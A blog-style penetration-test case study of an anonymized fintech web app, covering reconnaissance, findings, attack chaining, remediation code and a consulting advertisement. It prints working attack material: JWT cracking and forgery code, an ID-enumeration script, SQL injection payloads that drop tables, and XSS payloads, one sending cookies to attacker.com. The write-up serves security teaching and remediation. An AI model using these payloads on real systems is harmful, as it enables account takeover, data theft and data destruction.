---
layout: post
title: "Inside a Real Penetration Test: From Reconnaissance to Remediation"
meta_description: "*A technical walkthrough of web application security testing
  with real-world findings, business impact analysis, and lessons learned*"
author: hadi_rickit
date: 2025-11-17 09:25:30
intro_paragraph: >-
  

  ## Executive Summary


  Every penetration test tells a story—not just about vulnerabilities, but about how security assumptions fail in production environments. This case study examines a recent engagement with a mid-sized financial services platform (anonymized as "FinTech Co"), walking through the complete methodology from initial reconnaissance to final remediation.
---
**Key Findings Overview:**

* 3 Critical vulnerabilities (CVSS 9.0+)
* 7 High-severity issues (CVSS 7.0-8.9)
* 12 Medium-severity findings
* Total potential business impact: Account takeover, data exfiltration, regulatory compliance violations

What makes this case particularly instructive isn't the severity of findings—it's how seemingly minor misconfigurations cascaded into critical attack chains. This is the reality of modern web security: comprehensive protection requires thinking like an attacker.

- - -

## Engagement Scope and Methodology

### Target Environment

**FinTech Co** operates a customer-facing web application for financial account management, built on a modern stack:

* Frontend: React SPA with Next.js
* Backend: Node.js/Express API
* Database: PostgreSQL
* Authentication: JWT-based with OAuth2 integration
* Infrastructure: Cloud-hosted (AWS)

**Testing Scope:**

* External web application (production-like staging environment)
* API endpoints and business logic
* Authentication and authorization mechanisms
* Client-side security controls
* Third-party integrations

**Out of Scope:**

* Social engineering
* Physical security
* Denial of Service testing
* Production environment (staging mirror used)

### Testing Methodology

We followed a structured approach based on OWASP Testing Guide v4 and PTES (Penetration Testing Execution Standard):

1. **Reconnaissance** (2 days)

   * Passive information gathering
   * Technology fingerprinting
   * Attack surface mapping
2. **Vulnerability Discovery** (5 days)

   * Automated scanning with manual validation
   * Business logic testing
   * Authentication/authorization testing
   * Input validation analysis
3. **Exploitation** (3 days)

   * Proof-of-concept development
   * Attack chain construction
   * Impact assessment
4. **Reporting & Remediation Support** (2 days)

   * Technical report compilation
   * Executive summary preparation
   * Remediation consultation

- - -

## Phase 1: Reconnaissance—Mapping the Attack Surface

### Passive Intelligence Gathering

Before touching the application directly, we gathered publicly available information:

```shell
# Subdomain enumeration
amass enum -passive -d fintechco.example.com

# Technology fingerprinting
whatweb https://app.fintechco.example.com
wappalyzer (browser extension analysis)

# Historical data analysis
wayback_machine_downloader https://app.fintechco.example.com
```

**Key Discoveries:**

* **Forgotten staging subdomain** (`dev-api.fintechco.example.com`) with verbose error messages
* **Exposed API documentation** at `/api/docs` (Swagger UI left in production)
* **JavaScript source maps** revealing internal file structure and API endpoints
* **Third-party integrations** identified through Content Security Policy headers

### Active Reconnaissance

With baseline intelligence gathered, we moved to active probing:

**Technology Stack Identified:**

* Next.js 13.4.x (confirmed via `_next` directory structure)
* Express.js 4.18.x (via HTTP headers and error responses)
* JWT authentication (via token structure analysis)
* AWS CloudFront CDN (via response headers)
* Datadog monitoring integration (via script tags)

**Critical Finding #1: Information Disclosure via Development Infrastructure**

The forgotten `dev-api` subdomain was running with:

* `NODE_ENV=development`
* Detailed stack traces in error responses
* Unminified JavaScript with inline comments
* Database connection strings in verbose error messages

**Business Impact:** This environment leak provided attackers with a complete architectural blueprint, including internal service URLs, database schemas, and business logic flows. Risk of targeted attacks increased significantly.

**CVSS Score:** 7.5 (High) - Information Disclosure

- - -

## Phase 2: Authentication & Session Management

### JWT Implementation Analysis

The application used JWTs for session management. Initial token analysis revealed:

```javascript
// Decoded JWT header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Decoded payload
{
  "userId": "12345",
  "email": "user@example.com",
  "role": "customer",
  "iat": 1700000000,
  "exp": 1700086400
}
```

**Testing Approach:**

1. Token manipulation attempts
2. Algorithm confusion attacks
3. Secret brute-forcing
4. Token reuse and expiration testing

### Critical Finding #2: Weak JWT Secret

Using a custom wordlist combined with `rockyou.txt`, we successfully cracked the JWT secret:

```shell
# JWT cracking with hashcat
hashcat -m 16500 -a 0 jwt.txt rockyou.txt

# Secret discovered: "fintechco2023!"
```

The weak secret (`fintechco2023!`) appeared to be a default value that was never rotated. This allowed us to:

1. **Forge arbitrary tokens** for any user
2. **Escalate privileges** from "customer" to "admin"
3. **Bypass authentication** entirely

**Proof of Concept:**

```python
import jwt

# Forged token with admin privileges
payload = {
    "userId": "1",  # Admin user ID (enumerated)
    "email": "admin@fintechco.example.com",
    "role": "admin",
    "iat": 1700000000,
    "exp": 1800086400  # Extended expiration
}

secret = "fintechco2023!"
token = jwt.encode(payload, secret, algorithm="HS256")

# Use token to access admin endpoints
```

**Business Impact:** Complete authentication bypass. An attacker could impersonate any user, including administrators, gaining access to sensitive financial data, user PII, and administrative functions. Potential for mass data exfiltration and account manipulation.

**CVSS Score:** 9.8 (Critical) - Authentication Bypass

- - -

## Phase 3: Business Logic Vulnerabilities

### API Endpoint Analysis

With admin access forged, we mapped all available API endpoints:

```shell
GET  /api/v1/users
GET  /api/v1/users/:id
POST /api/v1/users
PUT  /api/v1/users/:id
DELETE /api/v1/users/:id
GET  /api/v1/transactions
POST /api/v1/transactions/transfer
GET  /api/v1/accounts/:id/balance
```

### Critical Finding #3: Broken Object Level Authorization (BOLA)

The `/api/v1/users/:id` endpoint suffered from Insecure Direct Object References (IDOR):

```jsonc
# Accessing other users' data with sequential ID enumeration
curl -H "Authorization: Bearer $TOKEN" \
  https://api.fintechco.example.com/api/v1/users/12346

# Response: Full user profile including PII
{
  "id": 12346,
  "email": "victim@example.com",
  "firstName": "Jane",
  "lastName": "Doe",
  "ssn": "XXX-XX-1234",  # Last 4 digits exposed
  "accountNumber": "9876543210",
  "balance": 45231.67
}
```

**The Flaw:** Authorization checks only verified that the user was authenticated—not that they had permission to access *specific* user records.

**Exploitation:**

```python
# Automated enumeration script
import requests

headers = {"Authorization": f"Bearer {forged_token}"}
base_url = "https://api.fintechco.example.com/api/v1/users"

for user_id in range(10000, 50000):
    response = requests.get(f"{base_url}/{user_id}", headers=headers)
    if response.status_code == 200:
        data = response.json()
        print(f"[+] User {user_id}: {data['email']} - Balance: ${data['balance']}")
```

**Business Impact:** Mass enumeration and exfiltration of all user data (40,000+ accounts). Exposure of PII including partial SSNs, account numbers, and real-time balance information. Regulatory violations (GDPR, CCPA, PCI-DSS), potential class-action lawsuits, and severe reputational damage.

**CVSS Score:** 9.1 (Critical) - Broken Access Control

- - -

## Phase 4: Input Validation & Injection Attacks

### SQL Injection Testing

While modern ORMs provide some protection, raw queries remain a vulnerability vector. We identified a search endpoint accepting user input:

```shell
GET /api/v1/transactions/search?query=<user_input>

```

**Testing Methodology:**

```javascript
# Basic SQL injection payloads
' OR '1'='1
' UNION SELECT NULL--
'; DROP TABLE users--
```

**Finding:** While classic SQL injection was mitigated by parameterized queries, we discovered **Second-Order SQL Injection** via the account nickname field:

```javascript
// User updates account nickname
POST /api/v1/accounts/update
{
  "nickname": "My Savings'; DROP TABLE transactions; --"
}

// Later, when generating reports (admin function)
// Query constructed insecurely:
SELECT * FROM transactions WHERE account_nickname = 'My Savings'; DROP TABLE transactions; --'
```

**Business Impact:** Potential for database manipulation, data destruction, or exfiltration through time-based blind SQL injection. This was rated High rather than Critical due to requiring admin privileges for exploitation.

**CVSS Score:** 7.2 (High) - SQL Injection

### Cross-Site Scripting (XSS)

**Reflected XSS in Error Messages:**

The application reflected user input in error messages without proper encoding:

```html
GET /api/v1/users/search?name=<script>alert(document.cookie)</script>

# Response HTML included unescaped input
<div class="error">No results found for: <script>alert(document.cookie)</script></div>
```

**Stored XSS in User Profiles:**

Profile "bio" fields allowed HTML without sanitization:

```javascript
POST /api/v1/users/profile
{
  "bio": "<img src=x onerror='fetch(`https://attacker.com?cookie=${document.cookie}`)'/>"
}
```

When other users viewed the profile, the malicious script executed in their context.

**Business Impact:** Session hijacking, credential theft, malware distribution, and phishing attacks against users. XSS can bypass CSRF protections and facilitate account takeover.

**CVSS Score:** 8.1 (High) - Stored XSS with Session Theft

- - -

## Phase 5: Client-Side Security

### JavaScript Analysis

Source map analysis revealed interesting business logic on the client side:

**Finding: Sensitive Logic in Client-Side Code**

```javascript
// Found in bundle.js.map
function calculateTransactionFee(amount) {
  if (amount < 1000) return 0;  // No fee under $1,000
  if (amount < 10000) return amount * 0.01;  // 1% fee
  return amount * 0.005;  // 0.5% fee for large transfers
}

// Fee validation only happened client-side
```

**Exploitation:** By intercepting and modifying API requests, we could bypass fee calculations entirely:

```javascript
// Original request
POST /api/v1/transactions/transfer
{
  "amount": 50000,
  "fee": 250,  // Correctly calculated
  "recipient": "12345"
}

// Modified request
POST /api/v1/transactions/transfer
{
  "amount": 50000,
  "fee": 0,  // Zero fee submitted
  "recipient": "12345"
}

// Server accepted without validation
```

**Business Impact:** Direct revenue loss through fee bypass. Over a month of testing, this could have resulted in tens of thousands in missed fees. Additionally demonstrates lack of server-side validation for financial calculations.

**CVSS Score:** 6.5 (Medium) - Business Logic Bypass

- - -

## Attack Chain: From Recon to Data Exfiltration

The most dangerous aspect of these findings was how they could be chained:

**Complete Attack Scenario:**

1. **Reconnaissance** → Discover dev subdomain and API documentation
2. **Information Gathering** → Extract JWT structure and identify weak secret
3. **Authentication Bypass** → Crack JWT secret, forge admin token
4. **Privilege Escalation** → Use forged token to access admin functions
5. **Data Exfiltration** → Exploit BOLA to enumerate and download all user data
6. **Persistence** → Create backdoor admin account
7. **Financial Impact** → Exploit fee bypass for illicit transfers

**Total Time to Complete Attack Chain:** Approximately 6 hours for a skilled attacker.

- - -

## Remediation Recommendations

### Immediate Actions (24-48 hours)

1. **Rotate JWT Secret**

   * Generate cryptographically secure secret (256-bit minimum)
   * Implement secret rotation policy
   * Invalidate all existing tokens
2. **Remove Development Infrastructure**

   * Shutdown all dev/staging subdomains from public internet
   * Implement strict environment separation
   * Remove API documentation from production
3. **Implement Object-Level Authorization**

```javascript
// Before
app.get('/api/v1/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user);
});

// After
app.get('/api/v1/users/:id', authenticate, async (req, res) => {
  const requestedId = req.params.id;
  const authenticatedUserId = req.user.id;
  const isAdmin = req.user.role === 'admin';
  
  // Users can only access their own data, admins can access any
  if (requestedId !== authenticatedUserId && !isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  const user = await User.findById(requestedId);
  res.json(user);
});
```

### Short-term Actions (1-2 weeks)

4. **Input Validation & Sanitization**

   * Implement server-side validation for all inputs
   * Use prepared statements consistently
   * Sanitize HTML output with DOMPurify or similar
5. **Implement Content Security Policy**

```
Content-Security-Policy: default-src 'self'; 
  script-src 'self' 'nonce-{random}'; 
  style-src 'self' 'nonce-{random}'; 
  img-src 'self' data: https:;
```

6. **Server-Side Business Logic Validation**

   * Move all fee calculations to server
   * Validate transaction amounts and limits
   * Implement rate limiting

### Long-term Actions (1-3 months)

7. **Security Architecture Review**

   * Implement defense-in-depth
   * Zero-trust authentication model
   * Regular security audits (quarterly)
8. **Security Development Lifecycle**

   * Mandatory code reviews with security focus
   * Automated security testing in CI/CD
   * Security training for development team
9. **Monitoring & Detection**

   * Implement SIEM for anomaly detection
   * Alert on unusual API access patterns
   * Log all authentication events

- - -

## Lessons Learned

### For Security Teams

**1. Defense in Depth is Non-Negotiable**

No single vulnerability destroyed this application's security—it was the combination. Each layer that failed made the next exploitation easier.

**2. Authentication ≠ Authorization**

The most common mistake we encounter: verifying someone is logged in without verifying they should access specific resources.

**3. Client-Side Security is an Oxymoron**

Never trust the client. All validation, business logic, and security controls must be enforced server-side.

### For Development Teams

**1. Secure Defaults Matter**

The weak JWT secret was likely a placeholder that made it to production. Use secure-by-default configurations and enforce rotation policies.

**2. Environment Isolation is Critical**

Development tools and verbose logging have no place in production. Strict environment separation prevents information disclosure.

**3. Security is a Feature, Not a Sprint Task**

Rushing features without security considerations creates technical debt that compounds. Security must be integrated throughout the development lifecycle.

### For Business Leaders

**1. Understand Your Risk Exposure**

These vulnerabilities could have resulted in:

* $10M+ in regulatory fines (GDPR, CCPA violations)
* Class-action lawsuits from affected customers
* Complete loss of customer trust and brand damage
* Emergency incident response costs ($50K-$200K)

**2. Penetration Testing ROI**

This engagement cost $15K and identified issues that could have cost millions. Regular testing (quarterly or after major releases) should be standard practice.

**3. Compliance ≠ Security**

Meeting compliance checkboxes doesn't guarantee security. PCI-DSS compliance wouldn't have caught these business logic flaws.

- - -

## Conclusion

Modern web applications are complex ecosystems where security depends on every layer functioning correctly. This case study demonstrates how seemingly minor misconfigurations—a weak JWT secret, missing authorization checks, client-side validation—cascade into critical vulnerabilities.

**The key takeaway:** Security testing isn't about finding that one "critical flaw." It's about understanding how systems fail, how attackers think, and how to build resilient applications that fail securely.

For FinTech Co, this engagement was a wake-up call that catalyzed meaningful security improvements. Within 90 days of remediation:

* All critical and high findings were resolved
* Security code reviews became mandatory
* Automated security testing was integrated into CI/CD
* Quarterly penetration tests were scheduled

**Your application likely has similar issues.** The question isn't whether vulnerabilities exist—it's whether you'll discover them before attackers do.

- - -

*Looking to understand your security posture? Gallifrey Consulting provides comprehensive penetration testing services for web applications, APIs, and cloud infrastructure. We don't just find vulnerabilities—we help you build security into your development process.*

*Contact us for a security assessment: security@gallifreyconsulting.com*